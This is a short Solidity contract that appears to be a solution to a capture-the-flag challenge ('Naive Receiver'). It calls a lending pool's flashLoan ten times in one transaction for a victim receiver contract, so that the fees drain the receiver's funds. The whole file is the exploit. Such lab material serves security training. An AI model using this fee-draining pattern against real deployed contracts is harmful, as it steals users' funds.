pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiver1Transaction {
    NaiveReceiverLenderPool pool;

    constructor(NaiveReceiverLenderPool _pool) {
        pool = _pool;
    }
    function callFlashLoan10Times(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external {
        for (uint8 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, token, amount, data);
        }
    }
}
